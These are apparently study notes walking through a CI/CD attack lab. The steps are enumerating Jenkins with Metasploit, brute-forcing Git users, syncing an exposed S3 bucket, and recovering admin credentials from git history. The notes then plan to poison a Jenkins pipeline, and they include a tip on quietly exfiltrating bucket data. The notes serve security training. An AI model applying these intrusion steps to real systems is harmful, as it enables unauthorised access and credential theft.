## Leaked Secrets to Poisoned Pipeline - Lab Design
- The components of this lab include:
- **Gitea**: This is the Source Code Management (SCM) service. While this is a self-hosted option, the attack in this scenario would be conducted similarly if this were a public SCM like GitHub or GitLab.
- **Jenkins**: This is the automation service. While we will have to use Jenkins-specific syntax for understanding and writing pipeline workflows, the general ideas apply to most other automation services.
- **Application**: This is a generic application that we will be targeting.
- The components will be accessible on the following subdomains when querying the custom DNS server:

|Component|	Subdomain|
|:-|:-|
|Gitea | git.offseclab.io|
|Jenkins |automation.offseclab.io |
|Application |app.offseclab.io |

#### Accessing the Labs
- After completing this section, we'll be able to start the lab. This provides us with:
     - A DNS server's IP address
     - A Kali IP address
     - A Kali Password
     - An AWS account with no permissions (more on this later)
- In order to access the services, we will need to configure our personal Kali machine (not the cloud instance) to use the provided DNS server. For this example, our DNS server will be hosted on 203.0.113.84.
- Listing the connection, my main network connection is wired so selecting "Wired connection 1"
```bash
nmcli connection # Print list of connections
sudo nmcli connection modify "Wired connection 1" ipv4.dns "x.x.x.x" # DNS IP Address is provided by lab specify in the field
sudo systemctl restart NetworkManager
sudo nano /etc/resolv.conf # Add the DNS ip address in resolv.conf
cat /etc/resolv.conf 
nslookup git.offseclab.io
```
## Enumeration
- As with every security assessment, we should start with gathering as much information as we can about the target. Gathering this information is crucial for being able to properly exploit an application.
- This Learning Unit covers the following Learning Objective:
     - Understand How to Enumerate a CI/CD System.

### Enumerating Jenkins
- An application, Git server  and automation server. Let's enumerate the automation server.

#### Enumerating Jenkins
- Access the Jenkins [automation.offseclab.io](http://automation.offseclab.io/login?from=%2F)
```bash
sudo msfdb init
msfconsole --quiet
search jenkins_enum
use auxiliary/scanner/http/jenkins_enum
show options
set RHOSTS automation.offseclab.io
set TARGETURI /
run
# [+] 54.165.165.130:80 - Jenkins Version 2.385
# Unfortunately, the authentication blocked the rest of the scan, so we've only gathered the version.
```

#### Enumerating the Git Server
- How we approach enumerating a Git server depends on the context. If an organization uses a hosted SCM solution like GitHub or GitLab, our enumeration will consist of more open-source intelligence relying on public repos, users, etc. While it's possible for these hosted solutions to have vulnerabilities, in an ethical security assessment, we would focus on the assets owned by our target and not a third party.
- If the organization hosts their own SCM and it's in scope, exploiting the SCM software would be part of the assessment. We would also search for any exposed information on a self-hosted SCM.
- For example, gathering information about exposed repositories would typically be scoped for both hosted and non-hosted SCMs. However, brute forcing commonly-used passwords would be ineffective on hosted SCMs, since they typically have hundreds of thousands of users who are not related to an organization. In a self-hosted SCM, brute forcing users and usernames might be part of our assessment.
- **Task** Brute force the users discovered in the SCM server and find the user with a weak password. What is that user's password?
- Brute force with 5 username and the password file is 500-worst-passwords.txt/

#### Enumerating the Application
- Access the Application [HTTP://app.offseclab.io](http://app.offseclab.io), then try to view the source code for any AWS information like images from the S3 buckets and other links.
```python
dirb http://app.offseclab.io # found only /index.html
curl  https://staticcontent-mit9cfx8fn4lnr01.s3.us-east-1.amazonaws.com # Access Denied
head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
dirb  https://staticcontent-mit9cfx8fn4lnr01.s3.us-east-1.amazonaws.com ./first50.txt # found https://staticcontent-mit9cfx8fn4lnr01.s3.us-east-1.amazonaws.com/.git/HEAD
# Configue the aws configure with aws lab details given in the lab
aws s3 ls staticcontent-mit9cfx8fn4lnr01
```

### Discovering Secrets
- We can list the bucket and access at least some of the files within, let's search for secrets. We'll do this by checking files we can and cannot download, then leverage tools to search the bucket for sensitive data.
     - Discover which files are accessible
     - Analyze Git history to discover secrets

#### Downloading the Bucket
- First review the contents
```bash
aws s3 ls staticcontent-mit9cfx8fn4lnr01
```
- First, we can determine this is most likely an entire git repository based off the .git directory. Next, we'll discover a Jenkinsfile that points to this potentially being part of a pipeline. We'll inspect this file more closely later. We also find a scripts directory that might be interesting.
- Let's first download all the content we can from the bucket. We know we have access to the images/ folder, but do we have access to the README.md file? Let's use the aws s3 command, this time with the cp operation to copy README.md from the staticcontent-mit9cfx8fn4lnr01 bucket to the current directory. We also need to add the s3:// directive to the bucket name to instruct the AWS CLI that we're copying from an S3 bucket and not a folder.
- If there is a large amount of sensitive information that could be valuable, we may attempt to exfiltrate data by copying it to another AWS S3 bucket rather than directly downloading it.
- Using the AWS S3 cp command allows faster transfers between buckets and gives us more time to access the data later without drawing immediate attention. Always monitor unusual S3 bucket activities and apply strict access control policies.
```bash
aws s3 cp s3://staticcontent-mit9cfx8fn4lnr01/README.md ./
```
-The README makes note of the scripts directory and how to upload to S3. Now that we know we can load the README.md file, let's try to download the rest of the bucket and inspect those scripts. We'll start by making a new directory called static_content. We'll then use the aws s3 command, but with the sync operator to sync all the contents from a source to a destination. We'll specify s3://staticcontent-mit9cfx8fn4lnr01 as the source and the newly created directory as the destination.
```bash
mkdir static_content
aws s3 sync s3://staticcontent-mit9cfx8fn4lnr01 ./static_content/
cd static_content/
```
- Let's start by reviewing the script in scripts/upload-to-s3.sh. Based on the contents of the README, we can assume this is the script used to upload the contents to S3. In this file, we're searching for any potential hard-coded AWS access keys that the developer may have forgotten about.
```bash
cat scripts/upload-to-s3.sh  # Below information in the script
# Upload images to s3
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
AWS_PROFILE=prod aws s3 sync $SCRIPT_DIR/../ s3://staticcontent-mit9cfx8fn4lnr01/ 
```
- Unfortunately for us, the script contains no secrets. It seems to be fairly straightforward and only uploads the content of the repo to S3. Let's list the scripts directory and check if other scripts contain useful information.
```bash
cat -n update-readme.sh  # Below content in the file
     1  # Update Readme to include collaborators images to s3
     2
     3  SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
     4
     5  SECTION="# Collaborators"
     6  FILE=$SCRIPT_DIR/../README.md
     7
     8  if [ "$1" == "-h" ]; then
     9    echo "Update the collaborators in the README.md file"
    10    exit 0
    11  fi
    12
    13  # Check if both arguments are provided
    14  if [ "$#" -ne 2 ]; then
    15    # If not, display a help message
    16    echo "Usage: $0 USERNAME PASSWORD"
    17    exit 1
    18  fi
    19
    20  # Store the arguments in variables
    21  username=$1
    22  password=$2
    23
    24  auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
    25
    26  USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
    27
    28  sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
    29  echo "$SECTION" >> $FILE
    30  echo "$USERNAMES" >> $FILE
    31  echo "" >> $FILE   
```
- It seems that the update-readme.sh script finds the collaborators from the SCM server and updates the README.md file. Based on the link used on line 26, Jack appears to be the repo owner. As we suspected earlier, the SCM does contain private repos
- We might determine that the script accepts a username and password as arguments. This is important to note because if we can find bash history of a user who has executed this script, we might be able to find the credentials for a git user.
- That's about everything useful we can obtain from this file currently. However, since this is a git repo, we have the entire history of all changes made to this repo. Let's use a more git-specific methodology to search for sensitive data.

#### Searching for Secrets in Git
- Since git not only stores the files in the repo, but all of its history, it's important when searching for secrets that we also examine the history. While certain tools may help us with this, it's important that we also conduct a cursory manual review if the automated scripts don't find anything.
- One tool we can use for this is gitleaks. We'll need to install it first. Let's use apt to update the list of packages, then install the gitleaks package.
```bash
sudo apt update
sudo apt install -y gitleaks
```
- To run gitleaks, we need to ensure we're in the root of the static_content folder. We'll then run the gitleaks binary with the detect subcommand.
```bash
gitleaks detect  # Below information from this command

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

5:05PM INF 7 commits scanned.
5:05PM INF scan completed in 73.7ms
5:05PM INF no leaks found
```
- Unfortunately, gitleaks did not find anything. However, it's always important to do a manual review. While we can't discover everything, we can focus on specific items that draw our attention. Let's start by running git log, which will list all the commits in the current branch.
```bash
git log   # Below information from this command                                              
-------------------TRUNCATED--------------------------
commit 534f1f6871ca3881adad0e1179c07fd220ee79cd
Author: Jack <jack@offseclab.io>
Date:   Tue Dec 10 20:31:50 2024 +0000

    Fix issue

commit ad0c4b46c15a28d9cf7d97661581ad0371ce5393
Author: Jack <jack@offseclab.io>
Date:   Mon Dec 9 20:31:49 2024 +0000

    Add Managment Scripts
-------------------TRUNCATED--------------------------
```
- The command outputs the git commit log in descending order of when the commit was made. In the git history, we find that after adding the management scripts, an issue had to be fixed. Let's inspect what was changed. To do this, we'll use git show and pass in the commit hash.
```bash
git show 534f1f6871ca3881adad0e1179c07fd220ee79cd  # Below information from this command  
commit 534f1f6871ca3881adad0e1179c07fd220ee79cd
Author: Jack <jack@offseclab.io>
Date:   Tue Dec 10 20:31:50 2024 +0000

    Fix issue

diff --git a/scripts/update-readme.sh b/scripts/update-readme.sh
index 02cff69..3fac4be 100644
--- a/scripts/update-readme.sh
+++ b/scripts/update-readme.sh
@@ -1,4 +1,5 @@
 # Update Readme to include collaborators images to s3
+
 SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 
 SECTION="# Collaborators"
@@ -9,9 +10,22 @@ if [ "$1" == "-h" ]; then
   exit 0
 fi
 
-USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H 'authorization: Basic YWRtaW5pc3RyYXRvcjo2djFxMmlua3ZkbXpnaGdv' | jq .\[\].username |  tr -d '"')
+# Check if both arguments are provided
+if [ "$#" -ne 2 ]; then
+  # If not, display a help message
+  echo "Usage: $0 USERNAME PASSWORD"
+  exit 1
+fi
+
+# Store the arguments in variables
+username=$1
+password=$2
+
+auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
+
+USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
 
 sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
 echo "$SECTION" >> $FILE
 echo "$USERNAMES" >> $FILE
-echo "" >> $FILE
+echo "" >> $FILE
\ No newline at end of file
```
- From the output, we find that the developer removed a pre-filled authorization header and replaced it with the ability to pass the credentials via command line. Mistakes like these are common when a developer is testing a script. The pre-filled credentials might still be valid and provide us with more access into the SCM server. Let's decode the header and try out the credentials.
- HTTP basic authentication headers are base64-encoded in the following format: <username>:<password>. To decode it, we need to use the base64 command with the --decode argument. We'll use echo with the header value to pipe it into the base64 utility.
```bash
echo "YWRtaW5pc3RyYXRvcjo2djFxMmlua3ZkbXpnaGdv" | base64 -d
# administrator:6v1q2inkvdmzghgo 
```
- Let's attempt to use these credentials in the SCM server. We'll navigate to the login page and click Sign In.

## Poisoning the Pipeline
- Now that we have access to view the git repositories, we can to enumerate further and attempt to poison the pipeline. A pipeline in CI/CD refers to the actions that must be taken to distribute a new version of an application. By automating many of these steps, the actions become repeatable. The pipeline might include compiling a program, seeding a database, updating a configuration, and much more.
- In many situations, the pipeline definition file can be found in the same repo that contains the application source. For GitLab, it's a **.gitlab-ci.yml** file. For GitHub, such files are defined in the **.github/workflows** folder. For Jenkins, a **Jenkinsfile** is used. Each of these has its own syntax for configuration.
- Commonly, specific actions trigger the pipeline to run. For example, a commit to the main branch might trigger a pipeline, or a pull request sent to the repo might trigger a pipeline to test the changes.
     - Enumerating the Repositories
     - Modifying the Pipeline
     - Enumerating the Builder
### Enumerating the Repositories
- Now that we're authenticated, let's attempt to visit the list of repositories in the [web](http://git.offseclab.io) again. We'll click Explore in the top menu.
- Once you looged into the git website then Explore -> Repositories 1. Image-transform, 2. Static_content
- In the Image-transform repository has Jenkins file
```bash
pipeline {
  agent any

  stages {

    
    stage('Validate Cloudfront File') {
      steps {
        withAWS(region:'us-east-1', credentials:'aws_key') {
            cfnValidate(file:'image-processor-template.yml')
        }
      }
    }

    stage('Create Stack') {
      steps {
        withAWS(region:'us-east-1', credentials:'aws_key') {
            cfnUpdate(
                stack:'image-processor-stack', 
                file:'image-processor-template.yml', 
                params:[
                    'OriginalImagesBucketName=original-images-mit9cfx8fn4lnr01',
                    'ThumbnailImageBucketName=thumbnail-images--mit9cfx8fn4lnr01'
                ], 
                timeoutInMinutes:10, 
                pollInterval:1000)
        }
      }
    }
  }
}
```
- Once again, we find the pipeline definition on line 1 and the use of any builder agent on line 2. This time, however, we actually have some steps. The first thing that sticks out to us is the use of [withAWS](https://www.jenkins.io/doc/pipeline/steps/pipeline-aws/#withaws-set-aws-settings-for-nested-block) on lines 9 and 17. This instructs Jenkins to load the AWS plugin. More importantly, it instructs the plugin to load with a set of credentials. On both lines 9 and 17, we find that credentials named "aws_key" are loaded here. This will set the environment variables AWS_ACCESS_KEY_ID for the access key ID, AWS_SECRET_ACCESS_KEY for the secret key, and AWS_DEFAULT_REGION for the region.
- As long as the administrator set up everything correctly, the account configured to these credentials should at the very least have permissions to create, modify, and delete everything in the CloudFormation template. If we can obtain these credentials, we might be able to escalate further.
- We should also review the CloudFormation template. We'll break up the template into multiple listings and explain each section.
```bash
01  AWSTemplateFormatVersion: '2010-09-09'
02
03  Parameters:
04    OriginalImagesBucketName:
05      Type: String
06      Description: Enter the name for the Original Images Bucket
07    ThumbnailImageBucketName:
08      Type: String
09      Description: Enter the name for the Thumbnail Images Bucket
10
11  Resources:
12    # S3 buckets for storing original and thumbnail images
13    OriginalImagesBucket:
14      Type: AWS::S3::Bucket
15      Properties:
16        BucketName: !Ref OriginalImagesBucketName
17        AccessControl: Private
18    ThumbnailImagesBucket:
19      Type: AWS::S3::Bucket
20      Properties:
21        BucketName: !Ref ThumbnailImageBucketName
22        AccessControl: Private
```
- The first part of the CloudFormation template accepts parameters for the names of two buckets. One holds the original images, while the other holds the thumbnails. Based on the repository and bucket names, we can assume this application processes images and creates thumbnails.
- Next, we find the definition of a lambda function.
```bash
24    ImageProcessorFunction:
25      Type: 'AWS::Lambda::Function'
26      Properties:
27        FunctionName: ImageTransform
28        Handler: index.lambda_handler
29        Runtime: python3.9
30        Role: !GetAtt ImageProcessorRole.Arn
31        MemorySize: 1024
32        Environment:
33          Variables:
34            # S3 bucket names
35            ORIGINAL_IMAGES_BUCKET: !Ref OriginalImagesBucket
36            THUMBNAIL_IMAGES_BUCKET: !Ref ThumbnailImagesBucket
37        Code:
38          ZipFile: |
39            import boto3
40            import os
41            import json
42
43            SOURCE_BUCKET = os.environ['ORIGINAL_IMAGES_BUCKET']
44            DESTINATION_BUCKET = os.environ['THUMBNAIL_IMAGES_BUCKET']
45
46
47            def lambda_handler(event, context):
48                s3 = boto3.resource('s3')
49
50                # Loop through all objects in the source bucket
51                for obj in s3.Bucket(SOURCE_BUCKET).objects.all():
52                    # Get the file key and create a new Key object
53                    key = obj.key
54                    copy_source = {'Bucket': SOURCE_BUCKET, 'Key': key}
55                    new_key = key
56                    
57                    # Copy the file from the source bucket to the destination bucket
58                    # TODO: this should process the image and shrink it to a more desirable size
59                    s3.meta.client.copy(copy_source, DESTINATION_BUCKET, new_key)
60                return {
61                    'statusCode': 200,
62                    'body': json.dumps('Success')
63                }
65    ImageProcessorScheduleRule:
66      Type: AWS::Events::Rule
67      Properties:
68        Description: "Runs the ImageProcessorFunction daily"
69        ScheduleExpression: rate(1 day)
70        State: ENABLED
71        Targets:
72          - Arn: !GetAtt ImageProcessorFunction.Arn
73            Id: ImageProcessorFunctionTarget
``` 
- The lambda function creates environment variables based on the names of the S3 bucket on lines 35 and 36. Lines 38 to 63 define the contents of the lambda function. We also have a rule to run the lambda function daily on lines 65-73. On line 30, we find that the lambda function has a role assigned to it. If we can modify this lambda function, we might be able to extract the credentials for that user. Let's continue reviewing this file and determine what this role can access.
```bash
74    ImageProcessorRole:
 75      Type: AWS::IAM::Role
 76      Properties:
 77        AssumeRolePolicyDocument:
 78          Version: '2012-10-17'
 79          Statement:
 80          - Effect: Allow
 81            Principal:
 82              Service:
 83              - lambda.amazonaws.com
 84            Action:
 85            - sts:AssumeRole
 86        Path: "/"
 87        Policies:
 88        - PolicyName: ImageProcessorLogPolicy
 89          PolicyDocument:
 90            Version: '2012-10-17'
 91            Statement:
 92            - Effect: Allow
 93              Action:
 94              - logs:CreateLogGroup
 95              - logs:CreateLogStream
 96              - logs:PutLogEvents
 97              Resource: "*"
 98        - PolicyName: ImageProcessorS3Policy
 99          PolicyDocument:
100            Version: '2012-10-17'
101            Statement:
102            - Effect: Allow
103              Action:
104                - "s3:PutObject"
105                - "s3:GetObject"
106                - "s3:AbortMultipartUpload"
107                - "s3:ListBucket"
108                - "s3:DeleteObject"
109                - "s3:GetObjectVersion"
110                - "s3:ListMultipartUploadParts"
111              Resource:
112                - !Sub arn:aws:s3:::${OriginalImagesBucket}
113                - !Sub arn:aws:s3:::${OriginalImagesBucket}/*
114                - !Sub arn:aws:s3:::${ThumbnailImagesBucket}
115                - !Sub arn:aws:s3:::${ThumbnailImagesBucket}/*
```
- The policy definition allows for updating the logs (lines 88-97), as well as access to get and update objects in the bucket (lines 98-115). While this is access that we currently do not have, it's not the most lucrative path we can go down.
- The credentials we found in the Jenkinsfile need to have access to apply this CloudFormation template. Thus, its permissions will always be higher than what we have access to in the lambda function.
- However, while we can most likely edit the Jenkinsfile (since we have access to the repo now), we need to check how to trigger the build. Jenkins might be configured to only run on manual intervention; if this is the case, we need to keep exploring. It might also be configured to routinely execute the pipeline. In such a scenario, we won't know how to trigger it until it executes. However, Jenkins might also be configured to run the build on each change to the repo. This is typically done by having the SCM server call a webhook for specific triggers. Let's check if the repo contains any configurations that will execute a pipeline on certain actions.
- In Gitea, the webhooks can be found in the **Webhooks tab under Settings** [LINK of webhooks](http://git.offseclab.io/Jack/image-transform/settings/hooks/2).
- Based on the settings, a Git Push will send a webhook to the automation server. Next, let's try to modify the Jenkinsfile to obtain a reverse shell from the builder.





# Special Thanks to the Creator of tools and Community
[![](https://github.com/WithSecureLabs.png?size=50)](https://github.com/WithSecureLabs)
